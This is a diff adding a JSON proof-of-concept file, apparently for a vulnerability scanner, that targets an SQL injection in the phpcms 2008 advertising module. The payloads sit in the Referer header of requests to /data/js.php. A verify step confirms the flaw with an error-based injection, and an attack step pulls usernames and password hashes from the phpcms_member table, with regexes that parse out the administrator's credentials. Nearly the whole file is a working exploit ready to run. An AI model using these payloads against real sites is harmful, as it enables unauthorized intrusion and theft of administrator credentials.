@@ -1,0 +1,69 @@
+{
+  "pocInfo": {
+    "vulID": "62274",
+    "version": "1",
+    "vulDate": "2011-11-21",
+    "createDate": "2015-09-15",
+    "updateDate": "2015-09-15",
+    "name": "phpcms_2008_ads_place.class.php_sql-inj",
+    "protocol": "http",
+    "vulType": "SQL Injection",
+    "author": "Medici.Yan",
+    "references": [
+      "http://www.seebug.org/vuldb/ssvid-62274"
+    ],
+    "appName": "phpcms",
+    "appVersion": "2008",
+    "appPowerLink": "http://www.phpcms.cn",
+    "desc": "phpcms 2008 中广告模块存在参数过滤不严导致 SQL 注入漏洞，利用该漏洞可进行信息泄露或管理员操作。根据服务器是否开启错误显示可直接利用或采用基于时间和错误的盲注方式。",
+    "samples": [
+      "http://127.0.0.1"
+    ]
+  },
+  "pocExecute": {
+    "verify": [
+      {
+        "step": "0",
+        "method": "get",
+        "vulPath": "/data/js.php",
+        "params": "id=1",
+        "necessary": "",
+        "headers": {
+          "Referer": "1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45,45),(SELECT md5(1)))a from information_schema.tables group by a)b), '0')#"
+        },
+        "status": "200",
+        "match": {
+          "regex": [
+            "c4ca4238a0b923820dcc509a6f75849b"
+          ],
+          "time": ""
+        }
+      }
+    ],
+    "attack": [
+      {
+        "step": "0",
+        "method": "get",
+        "vulPath": "/data/js.php",
+        "params": "id=1",
+        "necessary": "",
+        "headers": {
+          "Referer": "1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45),(SELECT concat(username,char(45,45,45),password,char(45,45)) from phpcms_member limit 1))a from information_schema.tables group by a)b), '0')#"
+        },
+        "status": "200",
+        "match": {
+          "regex": [
+            "Duplicate"
+          ],
+          "time": ""
+        },
+        "result": {
+          "AdminInfo": {
+            "Username": "<regex>--(.+)---",
+            "Password": "<regex>---(.+)--"
+          }
+        }
+      }
+    ]
+  }
+}
